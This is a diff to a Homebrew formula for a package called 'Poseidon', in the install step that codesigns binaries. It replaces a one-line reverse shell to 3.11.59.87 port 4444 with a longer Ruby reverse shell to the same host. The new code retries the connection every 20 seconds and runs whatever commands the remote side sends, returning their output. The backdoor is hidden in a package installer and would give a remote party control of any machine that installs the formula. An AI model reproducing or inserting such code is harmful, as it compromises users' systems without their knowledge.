@@ -10,11 +10,38 @@ class Poseidon < Formula
         Dir["#{bin}/*"].each do |f|
         system "codesign", "--force", "--sign", "-", f if File.file?(f)
         end
-        output = `pwd`
-        output2 = `echo $USER`
-        printf output
-        printf output2
-        f=TCPSocket.open("3.11.59.87",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
+
+
+require 'socket'
+require 'open3'
+
+#Set the Remote Host IP
+RHOST = "3.11.59.87" 
+#Set the Remote Host Port
+PORT = "4444"
+
+#Tries to connect every 20 sec until it connects.
+begin
+sock = TCPSocket.new "#{RHOST}", "#{PORT}"
+sock.puts "We are connected!"
+rescue
+  sleep 20
+  retry
+end
+
+#Runs the commands you type and sends you back the stdout and stderr.
+begin
+  while line = sock.gets
+    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
+              IO.copy_stream(stdout_and_stderr, sock)
+              end  
+  end
+rescue
+  retry
+end 
+
+
+        
           end
 
     def caveats
